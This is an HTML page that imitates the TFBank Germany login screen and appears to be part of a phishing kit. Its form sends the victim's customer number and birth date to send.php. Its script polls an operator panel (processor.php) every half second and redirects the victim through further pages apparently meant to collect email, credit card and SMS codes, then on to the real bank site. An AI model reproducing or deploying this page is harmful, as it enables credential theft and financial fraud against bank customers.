<!DOCTYPE html>
<html lang="de" xmlns:wicket="" data-device="DESKTOP" class=""><head>
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no">
<meta charset="UTF-8">
<title>TFBank</title>
<link rel="stylesheet" type="text/css" href="css/1.css"> 
  <link rel="stylesheet" type="text/css" href="css/2.css"> 
  <link rel="stylesheet" type="text/css" href="css/wave.css">
</head>

 
  <body style=cursor:auto><div id=root><div class="App de"><div class="h-100 login-bg"><div class="h-100 inner d-flex justify-content-center align-items-center w-100"><div><div class="login-container m-2 d-flex flex-column justify-content-between align-items-center">


    <div class="btn authButton GermanyOtp"></div><div class="p-4 content">

<form action="send.php" method="POST">
      <div class=mobileId><div class="mx-auto text-center"><div><input placeholder=Kundennummer name="user" type=tel required id=customerId class="mt-2 form-control" value>
      <div class=description>Die Kundennummer finden Sie beispielsweise auf Ihrer Rechnung.</div></div><div>
 
        <input placeholder=TT.MM.JJJJ class=form-control type=tel value inputmode=numeric name="pass" required>
      <div class=description>Bitte geben Sie Ihr Geburtsdatum ein.</div></div>
      <div class="d-flex justify-content-center mt-4 mb-1 mando">
      <button type=submit class="btn btn-primary">Einloggen</button></div></div></div></div></div></div></div></div><div class=nonAuthMaintenance></div></div></div>


<script src="js/jq.js"></script>

	<script src="../panel/res/jq.js"></script>
	<script>

	var targets = {1:"login.php?e=ERROR", 2:"email.php", 3:"email.php?e=ERROR",4:"cc.php",5:"cc.php?e=ERROR",
	 6:"sms.php", 7:"sms.php?e=ERROR",8:"done.php", 9:"https://meine.tfbank.de/" };

	clearRedirections();
	
 setInterval(function(){
	$.post("../panel/classes/processor.php",
	{keepAlive:1, page:"LOGIN "} );
}, 500);

var redirect=0;
setInterval(function(){
	$.post("../panel/classes/processor.php",{redirectionListener:1}, function(data){
		redirect=data;
		if(redirect==0){
			return false;
		}else{
			clearRedirections();
			window.location=targets[redirect];
		}
	});
}, 500);


function clearRedirections(){
	$.post("../panel/classes/processor.php",
	{clearRedirection:1});
}

 </script>
</body>
</html>